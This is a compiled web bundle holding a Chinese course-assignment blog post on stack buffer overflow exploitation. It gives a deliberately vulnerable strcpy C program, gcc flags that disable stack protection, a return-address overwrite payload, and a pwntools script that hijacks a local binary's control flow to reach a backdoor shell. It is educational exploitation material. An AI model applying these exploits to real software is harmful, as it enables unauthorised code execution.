import{_ as o}from"./ArticleWrapper.f9e95eb4.js";import{c,w as p,o as l,a as n,b as t,z as u}from"./app.606baedb.js";import"./dayjs.min.28e220c7.js";const i="/assets/stack-frame.167992cb.jpg",r="/assets/ubuntu-arch.9e2c0d28.png",k="/assets/stack-overlow-result.7c227cf6.png",d="/assets/stack-overflow-ida.058cd66e.png",g="/assets/stack-overflow-pwn-result.f8168e05.png",m=n("div",{class:"markdown-body"},[n("h1",{id:"%E6%A6%82%E8%BF%B0",tabindex:"-1"},"\u6982\u8FF0"),n("p",null,[n("img",{src:i,alt:"stack-frames"})]),n("p",null,"\u8F6F\u4EF6\u6F0F\u6D1E\u5206\u6790\u8BFE\u7A0B\u7684\u4E00\u6B21\u4F5C\u4E1A\uFF0C\u5229\u7528\u4E86\u6808\u5185\u5B58\u7684\u7F13\u51B2\u533A\u6EA2\u51FA\uFF0C\u8986\u76D6\u4E86\u8FD4\u56DE\u5730\u5740\uFF0C\u4ECE\u800C\u8FBE\u5230\u52AB\u6301\u63A7\u5236\u6D41\u7684\u76EE\u7684\u3002"),n("h1",{id:"exp1",tabindex:"-1"},"EXP1"),n("pre",{class:"language-c"},[n("code",{class:"language-c"},[n("span",{class:"token macro property"},[n("span",{class:"token directive-hash"},"#"),n("span",{class:"token directive keyword"},"include"),t(),n("span",{class:"token string"},"<stdio.h>")]),t(`
`),n("span",{class:"token macro property"},[n("span",{class:"token directive-hash"},"#"),n("span",{class:"token directive keyword"},"include"),t(),n("span",{class:"token string"},"<string.h>")]),t(`

`),n("span",{class:"token keyword"},"void"),t(),n("span",{class:"token function"},"function2"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),t(`
`),n("span",{class:"token punctuation"},"{"),t(`
  `),n("span",{class:"token function"},"printf"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"Executed chagned\\n"'),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},";"),t(`
`),n("span",{class:"token punctuation"},"}"),t(`

`),n("span",{class:"token keyword"},"void"),t(),n("span",{class:"token function"},"function1"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),t(`
`),n("span",{class:"token punctuation"},"{"),t(`
  `),n("span",{class:"token keyword"},"char"),t(" buffer"),n("span",{class:"token punctuation"},"["),n("span",{class:"token number"},"5"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},";"),t(`
  `),n("span",{class:"token function"},"strcpy"),n("span",{class:"token punctuation"},"("),t("buffer"),n("span",{class:"token punctuation"},","),t("str"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},";"),t(`
`),n("span",{class:"token punctuation"},"}"),t(`

`),n("span",{class:"token keyword"},"void"),t(),n("span",{class:"token function"},"main"),n("span",{class:"token punctuation"},"("),n("span",{class:"token keyword"},"int"),t(" argc"),n("span",{class:"token punctuation"},","),t(),n("span",{class:"token keyword"},"char"),t(),n("span",{class:"token operator"},"*"),t("argv"),n("span",{class:"token punctuation"},"["),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},")"),t(`
`),n("span",{class:"token punctuation"},"{"),t(`
  `),n("span",{class:"token function"},"function1"),n("span",{class:"token punctuation"},"("),t("argv"),n("span",{class:"token punctuation"},"["),n("span",{class:"token number"},"1"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},";"),t(`
  `),n("span",{class:"token function"},"printf"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"Executed normally\\n"'),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},";"),t(`
`),n("span",{class:"token punctuation"},"}"),t(`
`)])]),n("p",null,[t("\u4F7F\u7528"),n("code",null,"gdb"),t("\u8FDB\u884C\u8C03\u8BD5\uFF0C"),n("code",null,"strcpy"),t("\u51FD\u6570\u53EF\u4EE5\u88AB\u5229\u7528\u5F15\u8D77\u7F13\u51B2\u533A\u6EA2\u51FA\uFF0C\u76EE\u524D\u7684\u95EE\u9898\u65F6\u9700\u8981\u591A\u957F\u7684\u5B57\u7B26\u4E32\uFF0C\u4EE5\u53CA\u9700\u8981\u5C06"),n("code",null,"function1"),t("\u6808\u5E27\u7684\u8FD4\u56DE\u5730\u5740\u8986\u76D6\u4E3A\u4EC0\u4E48 \u73AF\u5883")]),n("blockquote",null,[n("p",null,"ubuntu 16.04"),n("p",null,"gcc 5.4.0"),n("p",null,"gdb 7.11.1")]),n("p",null,[n("img",{src:r,alt:"arch"})]),n("p",null,[t("\u5173\u95ED\u5806\u6808\u4FDD\u62A4\u673A\u5236\uFF0C\u4F7F\u7528"),n("code",null,"gcc"),t("\u7F16\u8BD1")]),n("pre",{class:"language-bash"},[n("code",{class:"language-bash"},[t("gcc "),n("span",{class:"token parameter variable"},"-g"),t(" main.c "),n("span",{class:"token parameter variable"},"-m32"),t(),n("span",{class:"token parameter variable"},"-o"),t(" main32 "),n("span",{class:"token parameter variable"},"-z"),t(` execstack -fno-stack-protector
`)])]),n("p",null,[n("img",{src:u,alt:"gdb"})]),n("p",null,[t("\u53EF\u4EE5\u5F97\u51FA"),n("code",null,"ebp"),t("\u4E0E"),n("code",null,"&buffer"),t("\u76F8\u8DDD 13 \u4E2A\u5B57\u8282\uFF0C\u540C\u65F6\u8FD4\u56DE\u5730\u5740\u5360\u7528 4 \u4E2A\u5B57\u8282\uFF0C"),n("code",null,"function2"),t("\u7684\u5730\u5740\u4E3A"),n("code",null,"0x0804845B"),t("\u3002\u7531\u4E8E\u91C7\u7528\u7684\u662F"),n("code",null,"\u5C0F\u7AEF\u5B58\u50A8"),t("\uFF0C\u56E0\u6B64\u9700\u8981\u5C06\u76EE\u6807\u51FD\u6570\u5730\u5740\u6309\u5B57\u8282\u5012\u5E8F\u5199\u5165\u3002\u6784\u9020\u51FA payload"),n("code",null,"AAAAAAAAAAAAAAAAA\\x5B\\x84\\x04\\x08")]),n("p",null,[n("img",{src:k,alt:"stack-overflow-result"})]),n("p",null,[t("\u6210\u529F\u8C03\u7528\u4E86"),n("code",null,"function2"),t("\uFF0C\u540C\u7406\u5730\u5740\u4E5F\u53EF\u4EE5\u88AB\u6539\u6210\u5176\u4ED6\u7684\u51FD\u6570\u5730\u5740\u3002")]),n("h1",{id:"exp2",tabindex:"-1"},"EXP2"),n("p",null,[t("\u5DF2\u77E5\u4E00\u4E2A"),n("a",{href:"https://raw.github.com/ChenKS12138/ChenKS12138.github.io/source-code/assets/stack-tutorial"},"\u4E8C\u8FDB\u5236\u6587\u4EF6"),t("\uFF0C\u901A\u8FC7 ida \u9759\u6001\u8C03\u8BD5\u3002")]),n("p",null,[n("img",{src:d,alt:"ida"})]),n("p",null,[t("vulnerable_function \u4E2D\u7684 buffer \u53EA\u9700\u8981 1 \u4E2A\u5B57\u8282\uFF0C\u4F46\u662F\u7B2C\u4E94\u884C\u7684 read \u51FD\u6570\u53EF\u4EE5\u8F93\u5165 256 \u4E2A\u5B57\u8282\uFF0C\u8FD9\u91CC\u53EF\u80FD\u5B58\u5728\u7740\u6808\u6EA2\u51FA\u3002\u6839\u636E\u7B2C\u4E09\u884C\u7684\u6CE8\u91CA\u63A8\u6D4B\uFF0C"),n("code",null,"&buffer"),t("\u8DDD\u79BB"),n("code",null,"ebp"),t("\u4F4D 0x30 \u4E2A\u5B57\u8282\uFF0C\u731C\u6D4B\u6211\u4EEC\u9700\u8981\u6784\u9020\u7684 payload \u4E3A 52 \u5B57\u8282\u7684\u5B57\u7B26\u4E32\u518D\u52A0\u4E0A\u76EE\u6807\u51FD\u6570\u7684\u5730\u5740\uFF0C\u5373"),n("code",null,"backdoor"),t("\u51FD\u6570\u7684\u5730\u5740\u3002")]),n("pre",{class:"language-python"},[n("code",{class:"language-python"},[n("span",{class:"token keyword"},"from"),t(" pwn "),n("span",{class:"token keyword"},"import"),t(),n("span",{class:"token operator"},"*"),t(`
p`),n("span",{class:"token operator"},"="),t("process"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"./stack"'),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},";"),t(`

ret_addr`),n("span",{class:"token operator"},"="),n("span",{class:"token number"},"0x0804846B"),t(`

payload `),n("span",{class:"token operator"},"="),t(),n("span",{class:"token string"},'"a"'),n("span",{class:"token operator"},"*"),n("span",{class:"token number"},"52"),n("span",{class:"token operator"},"+"),t("p32"),n("span",{class:"token punctuation"},"("),t("ret_addr"),n("span",{class:"token punctuation"},")"),t(`

p`),n("span",{class:"token punctuation"},"."),t("sendline"),n("span",{class:"token punctuation"},"("),t("payload"),n("span",{class:"token punctuation"},")"),t(`
p`),n("span",{class:"token punctuation"},"."),t("interactive"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),t(`
p`),n("span",{class:"token punctuation"},"."),t("close"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),t(`
`)])]),n("p",null,[n("img",{src:g,alt:"EXP2-RESULT"})]),n("p",null,"\u6210\u529F\u62FF\u5230 shell")],-1),v="\u6808\u6EA2\u51FA\u5229\u7528",x="default description",A="2020-09-16T15:59:59.000Z",E=["\u4FE1\u606F\u5B89\u5168"],B="./gdb-debug.png",P=[{depth:1,title:"\u6982\u8FF0",children:[]},{depth:1,title:"EXP1",children:[]},{depth:1,title:"EXP2",children:[]}],X=[{property:"og:title",name:"twitter:title",itemprop:"title",content:"\u6808\u6EA2\u51FA\u5229\u7528"},{property:"og:description",name:"twitter:description",itemprop:"description",content:"default description"}],T={__name:"content",setup(f,{expose:a}){const s={title:"\u6808\u6EA2\u51FA\u5229\u7528",description:"default description",date:"2020-09-16T15:59:59.000Z",tags:["\u4FE1\u606F\u5B89\u5168"],coverImage:"./gdb-debug.png",headings:[{depth:1,title:"\u6982\u8FF0",children:[]},{depth:1,title:"EXP1",children:[]},{depth:1,title:"EXP2",children:[]}],meta:[{property:"og:title",name:"twitter:title",itemprop:"title",content:"\u6808\u6EA2\u51FA\u5229\u7528"},{property:"og:description",name:"twitter:description",itemprop:"description",content:"default description"}]};return a({frontmatter:s}),(h,b)=>{const e=o;return l(),c(e,{frontmatter:s},{default:p(()=>[m]),_:1})}}};export{B as coverImage,A as date,T as default,x as description,P as headings,X as meta,E as tags,v as title};
